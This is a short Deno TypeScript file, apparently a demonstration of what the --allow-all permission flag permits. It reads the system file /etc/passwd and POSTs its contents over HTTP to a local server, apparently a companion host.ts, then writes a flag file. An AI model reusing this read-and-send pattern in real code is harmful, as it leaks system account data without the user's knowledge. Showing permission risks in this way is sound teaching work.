// This runs in parallel with `host.ts`.
const passwd = Deno.readTextFileSync("/etc/passwd");
await fetch("http://localhost:8000/", {
  method: "POST",
  body: passwd,
});

Deno.writeTextFileSync("flag.txt", "Demonstration of --allow-all");